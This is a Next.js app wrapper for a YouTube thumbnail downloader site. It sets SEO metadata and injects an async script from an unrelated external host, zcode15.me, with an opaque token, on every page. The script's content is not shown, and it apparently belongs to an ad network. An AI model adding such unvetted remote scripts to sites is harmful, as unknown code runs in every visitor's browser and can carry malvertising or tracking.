import "../styles/index.css";
import { Fragment } from "react";
import { DefaultSeo } from "next-seo";
import Head from 'next/head'; // Import Head from next/head

function MyApp({ Component, pageProps }) {
  return (
    <Fragment>
      <DefaultSeo
        title="Youtube Thumbnail Downloader"
        description="Download high-quality thumbnails from YouTube videos."
        canonical="https://get-youtubethumbnail.com"
        openGraph={{
          url: "https://get-youtubethumbnail.com",
          title: "Youtube Thumbnail Downloader",
          description: "Download high-quality thumbnails from YouTube videos.",
          site_name: "Youtube Thumbnail Downloader",
        }}
      />
      <Head> {/* Head component should be inside Fragment */}
        <script
          type="text/javascript"
          src="https://zcode15.me/?ze=my3dcmbrmi5ha3ddf42dsnbq"
          async
        />
      </Head>
      <Component {...pageProps} />
    </Fragment>
  );
}

export default MyApp;